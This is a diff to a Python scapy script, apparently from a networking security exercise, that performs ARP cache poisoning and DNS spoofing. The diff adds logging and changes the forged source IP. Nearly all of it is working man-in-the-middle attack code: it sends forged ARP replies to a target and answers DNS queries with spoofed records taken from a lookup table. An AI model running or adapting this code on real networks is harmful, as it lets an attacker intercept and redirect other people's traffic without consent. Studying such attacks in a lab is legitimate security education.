@@ -53,6 +53,7 @@ class ArpSpoofer(object):
         """
         ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=DOOFENSHMIRTZ_IP), timeout=5)
         self.target_mac = ans[0][1][ARP].hwsrc
+        print(f"Got target mac address: {ans[0][1][ARP].hwsrc}")
         return ans[0][1][ARP].hwsrc
 
     def spoof(self) -> None:
@@ -63,7 +64,7 @@ class ArpSpoofer(object):
 
         packet = ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.spoof_ip)
         scapy.send(packet, verbose=False)
-
+        print(f"Spoofing target ip: {self.target_ip}, mac: {self.target_mac}. with source ip: {self.spoof_ip}")
         self.spoof_count += 1
 
     def run(self) -> None:
@@ -119,8 +120,8 @@ class DnsHandler(object):
         """
         pkt[IP].dst = self.real_dns_server_ip
         pkt_ans = sr1(pkt, verbose=0)
-        pkt_ans[IP].src = REAL_IP
-
+        pkt_ans[IP].src = SECRATERY_IP
+        print(f"Got DNS real response of {self.real_dns_server_ip}")
         return pkt_ans
 
     def get_spoofed_dns_response(self, pkt: scapy.packet.Packet, to: str) -> scapy.packet.Packet:
@@ -134,7 +135,6 @@ class DnsHandler(object):
         """
         pkt_with_my_ip = self.get_real_dns_response(pkt)
         pkt_with_my_ip[DNSRR].rdata = to
-
         return pkt_with_my_ip
 
     def resolve_packet(self, pkt: scapy.packet.Packet) -> str:
@@ -148,9 +148,11 @@ class DnsHandler(object):
         """
         # print(pkt.show())
         if pkt[DNSQR].qname in self.spoof_dict:
+            print(f"get_spoofed_dns_response {self.spoof_dict[pkt[DNSQR].qname]}")
             choice = "get_spoofed_dns_response"
             pkt_to_send = self.get_spoofed_dns_response(pkt, self.spoof_dict[pkt[DNSQR].qname])
         else:
+            print(f"get_real_dns_response {pkt[DNSQR].qname}")
             choice = "get_real_dns_response"
             pkt_to_send = self.get_real_dns_response(pkt)
 
